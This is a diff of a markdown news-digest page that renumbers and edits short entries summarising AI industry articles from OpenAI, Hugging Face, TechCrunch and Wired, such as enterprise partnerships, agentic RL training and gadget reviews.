@@ -1176,15 +1201,24 @@ Learn how OpenAI protects user data when AI agents open links, preventing URL-ba
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 96. `EN` [PVH reimagines the future of fashion with OpenAI](data/articles/241c9fd7457d2cb76eeb012f2b54c708.html)
+### 98. `EN` [PVH reimagines the future of fashion with OpenAI](data/articles/241c9fd7457d2cb76eeb012f2b54c708.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 PVH Corp., parent company of Calvin Klein and Tommy Hilfiger, is adopting ChatGPT Enterprise to bring AI into fashion design, supply chain, and consumer engagement.
 
 </div>
 
+<div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
+
+### 99. `EN` [Unlocking Agentic RL Training for GPT-OSS: A Practical Retrospective](data/articles/225863ee2a2b3960611e90a0dfeffa52.html)
+**Source:** Hugging Face Blog | **Keyword:** `AI`
+Back to Articles Agentic reinforcement learning (RL) extends traditional LLM training by optimizing not just a single-turn response, but an entire decision-making process learned through direct interaction with an environment during training. Unlike traditional single-turn reinforcement learning or offline preference-based methods that rely on static datasets, agentic RL trains policies by actively collecting on-policy data as the agent plans actions, invokes tools, observes outcomes, and adapts its behavior over multi-step trajectories in either simulated or real environments. This interaction-driven optimization assigns credit across long-horizon decisions, where intermediate choices such as query reformulation, tool selection, and execution order directly influence downstream success. Training follows an iterative closed loop in which the agent interacts with the environment to collect rollout trajectories, computes rewards over these trajectories, updates the policy based on observed outcomes, and then uses the updated policy to drive the next round of interaction and data collection such as GRPO or PPO algorithms..
+LinkedIn is an AI-first company that's built agents to help professionals be more successful. In this setting, models must reason over incomplete
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 97. `EN` [Introducing Prism](data/articles/2d79546ea8ed850172be01c5032b27b7.html)
+### 100. `EN` [Introducing Prism](data/articles/2d79546ea8ed850172be01c5032b27b7.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 Prism is a free LaTeX-native workspace with GPT-5.2 built in, helping researchers write, collaborate, and reason in one place.
 
@@ -1192,7 +1226,7 @@ Prism is a free LaTeX-native workspace with GPT-5.2 built in, helping researcher
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 98. `EN` [Unrolling the Codex agent loop](data/articles/4d2f2d9410429793d61f829325ffbacc.html)
+### 101. `EN` [Unrolling the Codex agent loop](data/articles/4d2f2d9410429793d61f829325ffbacc.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 A technical deep dive into the Codex agent loop, explaining how Codex CLI orchestrates models, tools, prompts, and performance using the Responses API.
 
@@ -1200,7 +1234,7 @@ A technical deep dive into the Codex agent loop, explaining how Codex CLI orches
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 99. `EN` [Inside Praktika's conversational approach to language learning](data/articles/b746527079a49b96537379fcbad01d40.html)
+### 102. `EN` [Inside Praktika's conversational approach to language learning](data/articles/b746527079a49b96537379fcbad01d40.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 How Praktika uses GPT-4.1 and GPT-5.2 to build adaptive AI tutors that personalize lessons, track progress, and help learners achieve real-world language fluency
 
@@ -1208,7 +1242,7 @@ How Praktika uses GPT-4.1 and GPT-5.2 to build adaptive AI tutors that personali
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 100. `EN` [Cisco and OpenAI redefine enterprise engineering with AI agents](data/articles/b5479ebcde18607aa86da31c755c5b5c.html)
+### 103. `EN` [Cisco and OpenAI redefine enterprise engineering with AI agents](data/articles/b5479ebcde18607aa86da31c755c5b5c.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 Cisco and OpenAI redefine enterprise engineering with Codex, an AI software agent embedded in workflows to speed builds, automate defect fixes, and enable AI-native development.
 
@@ -1216,7 +1250,7 @@ Cisco and OpenAI redefine enterprise engineering with Codex, an AI software agen
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 101. `EN` [ServiceNow powers actionable enterprise AI with OpenAI](data/articles/89b0ac10d29b747d15f3a42ff45bb1a5.html)
+### 104. `EN` [ServiceNow powers actionable enterprise AI with OpenAI](data/articles/89b0ac10d29b747d15f3a42ff45bb1a5.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 ServiceNow expands access to OpenAI frontier models to power AI-driven enterprise workflows, summarization, search, and voice across the ServiceNow Platform.
 
@@ -1224,7 +1258,7 @@ ServiceNow expands access to OpenAI frontier models to power AI-driven enterpris
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 102. `EN` [AI for self empowerment](data/articles/439c521becb06ce6514fe4682950a825.html)
+### 105. `EN` [AI for self empowerment](data/articles/439c521becb06ce6514fe4682950a825.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 How AI can expand human agency by closing the capability overhang—helping people, businesses, and countries unlock real productivity, growth, and opportunity.
 
@@ -1232,7 +1266,7 @@ How AI can expand human agency by closing the capability overhang—helping peop
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 103. `EN` [Open Responses: What you need to know](data/articles/f04c2f0226eee97b08a803966ef98d10.html)
+### 106. `EN` [Open Responses: What you need to know](data/articles/f04c2f0226eee97b08a803966ef98d10.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles What is Open Responses? What do we need to know to build with Open Responses? Client Requests to Open Responses Changes for Inference Clients and Providers Open Responses for Routing Tools Sub Agent Loops Next Steps Open Responses is a new and open inference standard. Initiated by OpenAI, built by the open source AI community, and backed by the Hugging Face ecosystem, Open Responses is based on the Responses API and is designed for the future of Agents. In this blog post, we’ll look at how Open Responses works and why the open source community should use Open Responses.
 The era of the chatbot is long gone, and agents dominate inference workloads. Developers are shifting toward autonomous systems that reason, plan, and act over long-time horizons. Despite this shift, much of the ecosystem still uses the Chat Completion format, which was designed for turn-based conversations and falls short for agentic use cases. The Responses format was designed to address these limitations, but it is closed and not as widely adopted. The Chat Completion format is still the de facto standard despite the alt
@@ -1241,7 +1275,7 @@ The era of the chatbot is long gone, and agents dominate inference workloads. De
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 104. `EN` [Zenken boosts a lean sales team with ChatGPT Enterprise](data/articles/3465dbe784f0e8019c511c6aef1a8b45.html)
+### 107. `EN` [Zenken boosts a lean sales team with ChatGPT Enterprise](data/articles/3465dbe784f0e8019c511c6aef1a8b45.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 By rolling out ChatGPT Enterprise company-wide, Zenken has boosted sales performance, cut preparation time, and increased proposal success rates. AI-supported workflows are helping a lean team deliver more personalized, effective customer engagement.
 
@@ -1249,7 +1283,7 @@ By rolling out ChatGPT Enterprise company-wide, Zenken has boosted sales perform
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 105. `EN` [OpenAI and SoftBank Group partner with SB Energy](data/articles/323646ccb1c0d1fff3040d6dd75f77aa.html)
+### 108. `EN` [OpenAI and SoftBank Group partner with SB Energy](data/articles/323646ccb1c0d1fff3040d6dd75f77aa.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI and SoftBank Group partner with SB Energy to develop multi-gigawatt AI data center campuses, including a 1.2 GW Texas facility supporting the Stargate initiative.
 
@@ -1257,7 +1291,7 @@ OpenAI and SoftBank Group partner with SB Energy to develop multi-gigawatt AI da
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 106. `EN` [Datadog uses Codex for system-level code review](data/articles/61d07668ca24e9f47d3723bc5dfb435b.html)
+### 109. `EN` [Datadog uses Codex for system-level code review](data/articles/61d07668ca24e9f47d3723bc5dfb435b.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI and Datadog brand graphic with the OpenAI wordmark on the left, the Datadog logo on the right, and a central abstract brown fur-like texture panel on a white background.
 
@@ -1265,7 +1299,7 @@ OpenAI and Datadog brand graphic with the OpenAI wordmark on the left, the Datad
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 107. `EN` [Netomi’s lessons for scaling agentic systems into the enterprise](data/articles/52ec0eca2ce43c114603cc8e0938398a.html)
+### 110. `EN` [Netomi’s lessons for scaling agentic systems into the enterprise](data/articles/52ec0eca2ce43c114603cc8e0938398a.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 How Netomi scales enterprise AI agents using GPT-4.1 and GPT-5.2—combining concurrency, governance, and multi-step reasoning for reliable production workflows.
 
@@ -1273,7 +1307,7 @@ How Netomi scales enterprise AI agents using GPT-4.1 and GPT-5.2—combining con
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 108. `EN` [OpenAI for Healthcare](data/articles/359738e7b0d6b66d1eafad79959db809.html)
+### 111. `EN` [OpenAI for Healthcare](data/articles/359738e7b0d6b66d1eafad79959db809.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI for Healthcare enables secure, enterprise-grade AI that supports HIPAA compliance—reducing administrative burden and supporting clinical workflows.
 
@@ -1281,7 +1315,7 @@ OpenAI for Healthcare enables secure, enterprise-grade AI that supports HIPAA co
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 109. `EN` [Introducing ChatGPT Health](data/articles/a45ce88e0536046d1e61a95b4ebe5643.html)
+### 112. `EN` [Introducing ChatGPT Health](data/articles/a45ce88e0536046d1e61a95b4ebe5643.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 ChatGPT Health is a dedicated experience that securely connects your health data and apps, with privacy protections and a physician-informed design.
 
@@ -1289,7 +1323,7 @@ ChatGPT Health is a dedicated experience that securely connects your health data
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 110. `EN` [NVIDIA Cosmos Reason 2 Brings Advanced Reasoning To Physical AI](data/articles/423ae0f6e5006971519c872a315361e4.html)
+### 113. `EN` [NVIDIA Cosmos Reason 2 Brings Advanced Reasoning To Physical AI](data/articles/423ae0f6e5006971519c872a315361e4.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles NVIDIA Cosmos Reason 2: Reasoning Vision Language Model for Physical AI Key Highlights Popular Use Cases Other Models From The Cosmos Family: Cosmos Predict 2.5 Resources NVIDIA today released Cosmos Reason 2, the latest advancement in open, reasoning vision language models for physical AI. Cosmos Reason 2 surpasses its previous version in accuracy and tops the Physical AI Bench and Physical Reasoning leaderboards as the #1 open model for visual understanding. NVIDIA Cosmos Reason 2: Reasoning Vision Language Model for Physical AI Since their introduction, vision-language models have rapidly improved at tasks like object and pattern recognition in images. But they still struggle with tasks humans find natural, like planning several steps ahead, dealing with uncertainty or adapting to new situations. Cosmos Reason is designed to close this gap by giving robots and AI agents stronger common sense and reasoning to solve complex problems step by step.
 Cosmos Reason 2 is a state-of-the-art, open reasoning vision-language model (VLM) that enables robots and AI agents to see, understand, plan, and act in the physical world like humans. It uses
@@ -1298,7 +1332,7 @@ Cosmos Reason 2 is a state-of-the-art, open reasoning vision-language model (VLM
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 111. `EN` [NVIDIA brings agents to life with DGX Spark and Reachy Mini](data/articles/66f18b5ebf8053d89315ba1f53e3193b.html)
+### 114. `EN` [NVIDIA brings agents to life with DGX Spark and Reachy Mini](data/articles/66f18b5ebf8053d89315ba1f53e3193b.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles Ingredients Giving agentic powers to Reachy Building the agent Step 0: Set up and get access to models and services Step 1: Build a chat interface Step 2: Add NeMo Agent Toolkit’s built-in ReAct agent for tool calling Step 3: Add a router to direct queries to different models Step 4: Add a Pipecat bot for real-time voice + vision Step 5: Hook everything up to Reachy (hardware or simulation) Run the full system Try these example prompts Where to go next Today at CES 2026, NVIDIA unveiled a world of new open models to enable the future of agents, online and in the real world. From the recently released NVIDIA Nemotron reasoning LLMs to the new NVIDIA Isaac GR00T N1.6 open reasoning VLA and NVIDIA Cosmos world foundation models, all the building blocks are here today for AI Builders to build their own agents.
 But what if you could bring your own agent to life, right at your desk? An AI buddy that can be useful to you and process your data privately?
@@ -1308,7 +1342,7 @@ In the CES keynote today, Jensen Huang showed us how we can do exactly that, usi
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 112. `EN` [Continuously hardening ChatGPT Atlas against prompt injection](data/articles/22651b90723c0b8380b2013406ccefb8.html)
+### 115. `EN` [Continuously hardening ChatGPT Atlas against prompt injection](data/articles/22651b90723c0b8380b2013406ccefb8.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI is strengthening ChatGPT Atlas against prompt injection attacks using automated red teaming trained with reinforcement learning. This proactive discover-and-patch loop helps identify novel exploits early and harden the browser agent’s defenses as AI becomes more agentic.
 
@@ -1316,7 +1350,7 @@ OpenAI is strengthening ChatGPT Atlas against prompt injection attacks using aut
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 113. `EN` [Updating our Model Spec with teen protections](data/articles/d23b98b1f8816dba841d2474ca929870.html)
+### 116. `EN` [Updating our Model Spec with teen protections](data/articles/d23b98b1f8816dba841d2474ca929870.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI is updating its Model Spec with new Under-18 Principles that define how ChatGPT should support teens with safe, age-appropriate guidance grounded in developmental science. The update strengthens guardrails, clarifies expected model behavior in higher-risk situations, and builds on our broader work to improve teen safety across ChatGPT.
 
@@ -1324,7 +1358,7 @@ OpenAI is updating its Model Spec with new Under-18 Principles that define how C
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 114. `EN` [AI literacy resources for teens and parents](data/articles/e6aea9b0c8ad5e7fc0080f31b7cc1b1e.html)
+### 117. `EN` [AI literacy resources for teens and parents](data/articles/e6aea9b0c8ad5e7fc0080f31b7cc1b1e.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI shares new AI literacy resources to help teens and parents use ChatGPT thoughtfully, safely, and with confidence. The guides include expert-vetted tips for responsible use, critical thinking, healthy boundaries, and supporting teens through emotional or sensitive topics.
 
@@ -1332,7 +1366,7 @@ OpenAI shares new AI literacy resources to help teens and parents use ChatGPT th
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 115. `EN` [Introducing OpenAI Academy for News Organizations](data/articles/a32667d0ddfb120ce8762f55ad48d2cb.html)
+### 118. `EN` [Introducing OpenAI Academy for News Organizations](data/articles/a32667d0ddfb120ce8762f55ad48d2cb.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI is launching the OpenAI Academy for News Organizations, a new learning hub built with the American Journalism Project and The Lenfest Institute to help newsrooms use AI effectively. The Academy offers training, practical use cases, and responsible-use guidance to support journalists, editors, and publishers as they adopt AI in their reporting and operations.
 
@@ -1340,7 +1374,7 @@ OpenAI is launching the OpenAI Academy for News Organizations, a new learning hu
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 116. `EN` [Measuring AI’s capability to accelerate biological research](data/articles/1adfb68fe6b485e6b44cee17b654ec90.html)
+### 119. `EN` [Measuring AI’s capability to accelerate biological research](data/articles/1adfb68fe6b485e6b44cee17b654ec90.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI introduces a real-world evaluation framework to measure how AI can accelerate biological research in the wet lab. Using GPT-5 to optimize a molecular cloning protocol, the work explores both the promise and risks of AI-assisted experimentation.
 
@@ -1348,33 +1382,9 @@ OpenAI introduces a real-world evaluation framework to measure how AI can accele
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 117. `EN` [BBVA and OpenAI collaborate to transform global banking](data/articles/ea12893d31678e6907d7b328d905987d.html)
+### 120. `EN` [BBVA and OpenAI collaborate to transform global banking](data/articles/ea12893d31678e6907d7b328d905987d.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 BBVA is expanding its work with OpenAI through a multi-year AI transformation program, rolling out ChatGPT Enterprise to all 120,000 employees. Together, the companies will develop AI solutions that enhance customer interactions, streamline operations, and help build an AI-native banking experience.
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
-
-### 118. `EN` [BNY builds “AI for everyone, everywhere” with OpenAI](data/articles/e985fcef4e930a3e5f86faf1d301535d.html)
-**Source:** OpenAI Blog | **Keyword:** `AI`
-BNY is using OpenAI technology to expand AI adoption enterprise-wide. Through its Eliza platform, 20,000+ employees are building AI agents that enhance efficiency and improve client outcomes.
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
-
-### 119. `EN` [Increasing revenue 300% by bringing AI to SMBs](data/articles/5ba52d76bbe3c589b463f64c83fb0442.html)
-**Source:** OpenAI Blog | **Keyword:** `AI`
-Discover how Podium used OpenAI’s GPT-5 to build “Jerry,” an AI teammate driving 300% growth and transforming how Main Street businesses serve customers.
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
-
-### 120. `EN` [The Walt Disney Company and OpenAI reach landmark agreement to bring beloved characters to Sora](data/articles/1b2334cba21561b8b6d482094ed042d9.html)
-**Source:** OpenAI Blog | **Keyword:** `AI`
-Disney and OpenAI have reached an agreement to bring more than 200 Disney, Marvel, Pixar and Star Wars characters to Sora for fan-inspired short videos. The agreement emphasizes responsible AI in entertainment and includes Disney’s company-wide use of ChatGPT Enterprise and the OpenAI API.
 
 </div>
 
@@ -2117,17 +2127,9 @@ The feature is designed to work inside the website to understand its content and
 
 </div>
 
-<div class="article-item" data-lang="fr" data-category="openclaw" data-source="TechCrunch AI">
-
-### 89. `FR` [Amazon Fire TV’s new interface is now rolling out in the US](data/articles/fc03d3b096dd7a637a8c9d1980103a40.html)
-**Source:** TechCrunch AI | **Keyword:** `IA`
-Fire TV's new interface simplifies its layout and navigation and adds Alexa+.
-
-</div>
-
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="TechCrunch AI">
 
-### 90. `EN` [Here are the 17 US-based AI companies that have raised $100M or more in 2026](data/articles/d149c58affbde81258bc58b68e1c84ba.html)
+### 89. `EN` [Here are the 17 US-based AI companies that have raised $100M or more in 2026](data/articles/d149c58affbde81258bc58b68e1c84ba.html)
 **Source:** TechCrunch AI | **Keyword:** `AI`
 Three U.S.-based AI companies raised rounds larger than $1 billion so far in 2026, with 14 others raising rounds of $100 million or more.
 
@@ -2135,7 +2137,7 @@ Three U.S.-based AI companies raised rounds larger than $1 billion so far in 202
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="TechCrunch AI">
 
-### 91. `EN` [India bids to attract over $200B in AI infrastructure investment by 2028](data/articles/ad18bbfb16c20b34490b31c2fcfca530.html)
+### 90. `EN` [India bids to attract over $200B in AI infrastructure investment by 2028](data/articles/ad18bbfb16c20b34490b31c2fcfca530.html)
 **Source:** TechCrunch AI | **Keyword:** `AI`
 India is ramping up shared AI compute, adding 20,000 GPUs as part of a broader push to attract global AI investment.
 
@@ -2143,23 +2145,15 @@ India is ramping up shared AI compute, adding 20,000 GPUs as part of a broader p
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="TechCrunch AI">
 
-### 92. `EN` [SpendRule raises $2M, emerges from stealth to help hospitals track spending](data/articles/5cc2061eb87d68a788a47faea36e3abd.html)
+### 91. `EN` [SpendRule raises $2M, emerges from stealth to help hospitals track spending](data/articles/5cc2061eb87d68a788a47faea36e3abd.html)
 **Source:** TechCrunch AI | **Keyword:** `AI`
 SpendRule, launched last summer, is an AI-powered platform that helps healthcare systems track their spending.
 
 </div>
 
-<div class="article-item" data-lang="en" data-category="openclaw" data-source="TechCrunch AI">
-
-### 93. `EN` [Just 8 months in, India’s vibe-coding startup Emergent claims ARR of over $100M](data/articles/9f7f5c5dd19ff94be9c740e595d46dee.html)
-**Source:** TechCrunch AI | **Keyword:** `AI`
-Indian vibe-coding platform Emergent was launched just eight months ago, and it now says it's generating annual recurring revenue of more than $100 million, thanks to surging demand by small businesses and non-technical users.
-
-</div>
-
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 94. `EN` [Inside the Homeland Security Forum Where ICE Agents Talk Shit About Other Agents](data/articles/482fb2aee87da9f215e5467f129ad703.html)
+### 92. `EN` [Inside the Homeland Security Forum Where ICE Agents Talk Shit About Other Agents](data/articles/482fb2aee87da9f215e5467f129ad703.html)
 **Source:** Wired | **Keyword:** `AI`
 Forum members have discussed their discomfort with mass deportation efforts, debate how federal agents have interacted with civilians, and complain about their working conditions.
 
@@ -2167,7 +2161,7 @@ Forum members have discussed their discomfort with mass deportation efforts, deb
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 95. `EN` [The Simplest Android App for Scanning Documents](data/articles/63a073cceaa7c5637d99f90e9dcefd59.html)
+### 93. `EN` [The Simplest Android App for Scanning Documents](data/articles/63a073cceaa7c5637d99f90e9dcefd59.html)
 **Source:** Wired | **Keyword:** `AI`
 Most scanning apps try to get you to buy a cloud storage subscription or pay for extras. Not FairScan, which is free and open-source, and has some powerful features.
 
@@ -2175,7 +2169,7 @@ Most scanning apps try to get you to buy a cloud storage subscription or pay for
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 96. `EN` [AI Digital Twins Are Helping People Manage Diabetes and Obesity](data/articles/e10c36f68b5160ba4816aa6cd61747d6.html)
+### 94. `EN` [AI Digital Twins Are Helping People Manage Diabetes and Obesity](data/articles/e10c36f68b5160ba4816aa6cd61747d6.html)
 **Source:** Wired | **Keyword:** `AI`
 AI Digital Twins Are Helping People Manage Diabetes and Obesity
 
@@ -2183,7 +2177,7 @@ AI Digital Twins Are Helping People Manage Diabetes and Obesity
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 97. `EN` [The Small English Town Swept Up in the Global AI Arms Race](data/articles/343539303cf0c9fc00e616aa7a8280f8.html)
+### 95. `EN` [The Small English Town Swept Up in the Global AI Arms Race](data/articles/343539303cf0c9fc00e616aa7a8280f8.html)
 **Source:** Wired | **Keyword:** `AI`
 The residents of Potters Bar are working to protect the “greenbelt” of farms, forests, and meadows that surround London from the endless demand for AI infrastructure.
 
@@ -2191,7 +2185,7 @@ The residents of Potters Bar are working to protect the “greenbelt” of farms
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 98. `EN` [Saatva Memory Foam Hybrid Mattress Review: Going for Gold and Good Sleep](data/articles/3093b4e99e9bda9bb1ed42fc73c4a00c.html)
+### 96. `EN` [Saatva Memory Foam Hybrid Mattress Review: Going for Gold and Good Sleep](data/articles/3093b4e99e9bda9bb1ed42fc73c4a00c.html)
 **Source:** Wired | **Keyword:** `AI`
 The Saatva Memory Foam Hybrid has been chosen for Olympians. Could it be the one for you, too?
 
@@ -2199,7 +2193,7 @@ The Saatva Memory Foam Hybrid has been chosen for Olympians. Could it be the one
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 99. `EN` [Amazon Props Up Misleading, Junky Laptops No One Should Buy](data/articles/fa3cf23feedd1509001d91778ff3bac5.html)
+### 97. `EN` [Amazon Props Up Misleading, Junky Laptops No One Should Buy](data/articles/fa3cf23feedd1509001d91778ff3bac5.html)
 **Source:** Wired | **Keyword:** `AI`
 Amazon Props Up Misleading, Junky Laptops No One Should Buy
 
@@ -2207,7 +2201,7 @@ Amazon Props Up Misleading, Junky Laptops No One Should Buy
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 100. `EN` [Inside the App Where Queer Gooners Run Free](data/articles/7a6956be2181f4e5756cea512117a1fb.html)
+### 98. `EN` [Inside the App Where Queer Gooners Run Free](data/articles/7a6956be2181f4e5756cea512117a1fb.html)
 **Source:** Wired | **Keyword:** `AI`
 Inside the App Where Queer Gooners Run Free
 
@@ -2215,7 +2209,7 @@ Inside the App Where Queer Gooners Run Free
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 101. `EN` [The El Paso No-Fly Debacle Is Just the Beginning of a Drone Defense Mess](data/articles/e744b1f60ed16d260dc4f938338250e6.html)
+### 99. `EN` [The El Paso No-Fly Debacle Is Just the Beginning of a Drone Defense Mess](data/articles/e744b1f60ed16d260dc4f938338250e6.html)
 **Source:** Wired | **Keyword:** `AI`
 Fears over a drug cartel drone over Texas sparked a recent airspace shutdown in El Paso and New Mexico, highlighting just how tricky it can be to deploy anti-drone weapons near cities.
 
@@ -2223,7 +2217,7 @@ Fears over a drug cartel drone over Texas sparked a recent airspace shutdown in 
 
 <div class="article-item" data-lang="fr" data-category="openclaw" data-source="Wired">
 
-### 102. `FR` [Sony LinkBuds Clip Review: Solid Buds, Premium Price](data/articles/982aa9ae2cb14d20cbc448cc9c5cdb36.html)
+### 100. `FR` [Sony LinkBuds Clip Review: Solid Buds, Premium Price](data/articles/982aa9ae2cb14d20cbc448cc9c5cdb36.html)
 **Source:** Wired | **Keyword:** `IA`
 Sony’s new LinkBuds Clip serve up solid performance, but I’d wait until they’re on sale.
 
@@ -2231,7 +2225,7 @@ Sony’s new LinkBuds Clip serve up solid performance, but I’d wait until they
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 103. `EN` [Makers Are Building Back Against ICE](data/articles/90444ebee0a7ec636270cea33d065112.html)
+### 101. `EN` [Makers Are Building Back Against ICE](data/articles/90444ebee0a7ec636270cea33d065112.html)
 **Source:** Wired | **Keyword:** `AI`
 In hacker spaces and at their homes, creative protesters are laser-cutting and 3D-printing tools to resist an occupation.
 
@@ -2239,7 +2233,7 @@ In hacker spaces and at their homes, creative protesters are laser-cutting and 3
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 104. `EN` [The Nothing That Has the Potential to Be Anything](data/articles/54f542c19d8bab03f682bf0300da9e35.html)
+### 102. `EN` [The Nothing That Has the Potential to Be Anything](data/articles/54f542c19d8bab03f682bf0300da9e35.html)
 **Source:** Wired | **Keyword:** `AI`
 You can never truly empty a box. Why? Zero-point energy.
 
@@ -2247,7 +2241,7 @@ You can never truly empty a box. Why? Zero-point energy.
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 105. `EN` [Google’s AI Overviews Can Scam You. Here’s How to Stay Safe](data/articles/b489065583f69dd47554edcc6ada28eb.html)
+### 103. `EN` [Google’s AI Overviews Can Scam You. Here’s How to Stay Safe](data/articles/b489065583f69dd47554edcc6ada28eb.html)
 **Source:** Wired | **Keyword:** `AI`
 Beyond mistakes or nonsense, deliberately bad information being injected into AI search summaries is leading people down potentially harmful paths.
 
@@ -2255,7 +2249,7 @@ Beyond mistakes or nonsense, deliberately bad information being injected into AI
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 106. `EN` [9 Best Windows Laptops (2026): WIRED-Tested Laptops to Buy](data/articles/d8f6fd0aa4f57084decb27d27c4c8344.html)
+### 104. `EN` [9 Best Windows Laptops (2026): WIRED-Tested Laptops to Buy](data/articles/d8f6fd0aa4f57084decb27d27c4c8344.html)
 **Source:** Wired | **Keyword:** `AI`
 Windows laptops have never been so good, and they're only going to get better as we move through 2026.
 
@@ -2263,7 +2257,7 @@ Windows laptops have never been so good, and they're only going to get better as
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 107. `EN` [CurrentBody LED Hair Growth Helmet Review: Baby Hairs Abound (2026)](data/articles/00edac5e03909b291c222237fca658f2.html)
+### 105. `EN` [CurrentBody LED Hair Growth Helmet Review: Baby Hairs Abound (2026)](data/articles/00edac5e03909b291c222237fca658f2.html)
 **Source:** Wired | **Keyword:** `AI`
 This FDA-cleared red-light helmet helps spur hair growth and is Bluetooth-enabled with a comfortable design. But don’t expect results overnight.
 
@@ -2271,7 +2265,7 @@ This FDA-cleared red-light helmet helps spur hair growth and is Bluetooth-enable
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 108. `EN` [AI, Fancy Footwear, and All the Other Gear Powering Olympic Bobsledding](data/articles/d8cbd6293036fa848c3b40b3699c59b7.html)
+### 106. `EN` [AI, Fancy Footwear, and All the Other Gear Powering Olympic Bobsledding](data/articles/d8cbd6293036fa848c3b40b3699c59b7.html)
 **Source:** Wired | **Keyword:** `AI`
 Bobsledders rely a lot on specialized equipment to perform well and stay safe during the "Formula 1 of ice.” Here’s a quick guide.
 
@@ -2279,7 +2273,7 @@ Bobsledders rely a lot on specialized equipment to perform well and stay safe du
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 109. `EN` [Best Apple Watch (2026): Series 11, SE 3, and Ultra 3](data/articles/89befa74ec59c0c511fd5ea65044abb5.html)
+### 107. `EN` [Best Apple Watch (2026): Series 11, SE 3, and Ultra 3](data/articles/89befa74ec59c0c511fd5ea65044abb5.html)
 **Source:** Wired | **Keyword:** `AI`
 Should you splurge on the new Series 11, or will the SE 3 do? Let us help you figure out which version to get (and which to avoid).
 
@@ -2287,7 +2281,7 @@ Should you splurge on the new Series 11, or will the SE 3 do? Let us help you fi
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 110. `EN` [How to Choose the Right Gaming Laptop (2026): What You Need to Know](data/articles/a2ecc20c410a8e3b0a2542faaf9bcc66.html)
+### 108. `EN` [How to Choose the Right Gaming Laptop (2026): What You Need to Know](data/articles/a2ecc20c410a8e3b0a2542faaf9bcc66.html)
